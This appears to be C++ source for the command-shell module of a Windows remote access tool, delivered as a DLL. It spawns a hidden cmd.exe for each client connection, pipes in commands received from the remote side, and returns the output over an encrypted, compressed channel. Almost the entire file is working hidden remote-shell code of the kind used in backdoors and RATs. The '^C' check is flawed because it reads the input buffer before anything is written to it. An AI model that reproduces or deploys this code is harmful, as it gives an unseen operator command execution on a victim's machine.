// execCmd.cpp : Defines the entry point for the DLL application.
//
#include "execCmd.h"
#include "conn.h"
#include "macro.h"
#include "svrdll.h"

#include <time.h>
#include <windows.h>
#include <process.h>
#include <map>

using namespace std;

typedef struct PipeStruct
{
	HANDLE hReadPipe;
	HANDLE hWritePipe;
	HANDLE hShellWrite;
	HANDLE hShellRead;
	PROCESS_INFORMATION pi;
}PipeStruct;

static map<conn, PipeStruct> allPipes;//存放所有会话的管道信息

static int ClosePipe(conn s)
{
	if(allPipes.find(s) == allPipes.end())
		return -1;

	//printf("---------------------------\n");
	TerminateProcess(allPipes[s].pi.hProcess, 0);
	CloseHandle(allPipes[s].pi.hThread);
	CloseHandle(allPipes[s].pi.hProcess);
	CloseHandle(allPipes[s].hReadPipe);
	CloseHandle(allPipes[s].hShellWrite);
	CloseHandle(allPipes[s].hShellRead);
	CloseHandle(allPipes[s].hWritePipe);

	allPipes.erase(s);
	return 0;
}

int CmdShell(conn s, char* buf, int n, writeToClient fn)
{
	control_header header = INITIALIZE_ENCYRPT_HEADER(CONTROL_REQUEST_SHELL);
	//control_header header = INITIALIZE_HEADER(CONTROL_REQUEST_SHELL);
	const int BUFFER_SIZE = 1024;
	char dataBuffer[BUFFER_SIZE+1] = {0};
	DWORD lBytesRead;
	char input[BUFFER_SIZE] = {0};
	int nStatus = 0;

	header.isCompressed = 1;
	
	if(allPipes.find(s) == allPipes.end())
	{
		//printf("++++++++++++++++++++++++++++++\n");
		SECURITY_ATTRIBUTES sa;
		STARTUPINFO si = {0};
		PROCESS_INFORMATION pi;
		HANDLE hShellWrite = NULL, hReadPipe = NULL;
		HANDLE hShellRead = NULL, hWritePipe = NULL;
		char lpShellName[MAX_PATH];

		GetEnvironmentVariable("ComSpec", lpShellName, MAX_PATH);

		sa.nLength = sizeof(SECURITY_ATTRIBUTES);
		sa.lpSecurityDescriptor = NULL;
		sa.bInheritHandle = TRUE;

		if (!CreatePipe(&hReadPipe, &hShellWrite, &sa, 0))
			goto session_error;

		if (!CreatePipe(&hShellRead, &hWritePipe, &sa, 0))
			goto session_error;

		si.cb = sizeof(STARTUPINFO);
		si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
		si.wShowWindow = SW_HIDE;
		si.hStdInput = hShellRead;
		si.hStdOutput = hShellWrite;
		si.hStdError = hShellWrite;
		if (!CreateProcess(lpShellName, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
			goto session_error;

		allPipes[s].pi = pi;
		allPipes[s].hReadPipe = hReadPipe;
		allPipes[s].hWritePipe = hWritePipe;
		allPipes[s].hShellRead = hShellRead;
		allPipes[s].hShellWrite = hShellWrite;

		//读取欢迎消息
		Sleep(1500);
		if (!PeekNamedPipe(allPipes[s].hReadPipe, dataBuffer, 1, &lBytesRead, NULL, NULL))
			goto session_error;
		if(lBytesRead)
		{
			if (!ReadFile(allPipes[s].hReadPipe, dataBuffer, BUFFER_SIZE, &lBytesRead, NULL))
				goto session_error;

			/*
			if(fn)
			{
				header.seq++;
				header.dataLen = lBytesRead;
				//fn(s, (const char*)&header, sizeof(header));
				fn(s, &header, dataBuffer, lBytesRead);
			}
			*/
		}
	}

	if(strcmp(input, "^C") == 0)
		goto session_error;	

	//一定要在后面加上回车
	sprintf(input, "%s\r\n", buf);
	n = strlen(input);

	//往管道里写数据，相当于发送命令，注意数据写完后需要等待一段时间
	if (!WriteFile(allPipes[s].hWritePipe, input, n, &lBytesRead, NULL))
		goto session_error;	
	Sleep(2500);
	
	bool wait = false;
	while (1)
	{
		memset(dataBuffer, 0, sizeof(dataBuffer));
		
		//询问管道里是否还有输出数据
		if (!PeekNamedPipe(allPipes[s].hReadPipe, dataBuffer, 1, &lBytesRead, NULL, NULL))
			goto session_error;

		//没有就可以认为此次任务执行完毕
		if(lBytesRead == 0)
		{
			if(wait)	{	Sleep(1000); continue;}//这种针对执行会经过长时间才能响应有输出的那种命令
			else		break;
		}

		//否则读取输出数据，并将其发送给客户端
		if (!ReadFile(allPipes[s].hReadPipe, dataBuffer, BUFFER_SIZE, &lBytesRead, NULL))
			goto session_error;
		
		//是否为阻塞的命令
		if(strncmp(dataBuffer, input, n) == 0 && n == lBytesRead)
			wait = true;
		else	wait = false;
		
		if(fn)
		{
			header.seq++;
			header.dataLen = lBytesRead;
			fn(s, &header, dataBuffer, lBytesRead);
		}
		Sleep(100);
	}

	//发送数据结束命令
	if(fn)
	{
		header.dataLen = -1;
		if(fn(s, &header, NULL, -1) <= 0)
			nStatus = -1;
	}
	return nStatus;

session_error:
	ClosePipe(s);
	
	if(fn)
	{
		header.response = GetLastError();
		fn(s, &header, NULL, 0);
	}
	return 0;
}

int OnCmdUninitialize(void *p)
{
	conn s = (conn)p;
	return ClosePipe(s);
}